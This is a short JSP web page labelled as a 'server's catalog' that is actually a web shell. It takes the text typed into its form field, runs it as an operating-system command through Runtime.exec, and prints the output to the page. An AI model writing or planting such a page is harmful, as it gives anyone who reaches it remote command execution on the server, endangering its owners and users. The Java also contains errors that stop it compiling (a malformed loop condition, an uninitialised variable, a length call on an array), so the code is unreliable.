<%@ page contentType="text/html;charset=GB2312" %>
<%@ page language="java" %>
<%@ page import="java.io.*"%>
<html>
<head><title>getcatalog</title></head>
<body>
	<p><h1><b>This is server's catalog:</b></h1></p>
	<form method = "POST">
	<input type="text" name="instructor">
	<input type="submit" value="submit">
	</form>	
	<%
	String s3 = request.getParameter("instructor");
	String s1,temp;
	String []s2;
	Runtime r = Runtime.getRuntime();
	if(s3!=null){
		Process p = r.exec(s3);
		BufferedReader br= new BufferedReader(new InputStreamReader(p.getInputStream()));
		while(s1 = br.readLine()!=null)temp += s1;
		s2 = temp.split("\\s+");
		for(int i=0;i<s2.length();i++){%>
			<p><img src=picture/apple_icon.gif height="30" width="30" alt="folder " style="cursor:pointer"><%=s2[i]%></p>
		<%} 
	}
	%>
</body>
</html>
	
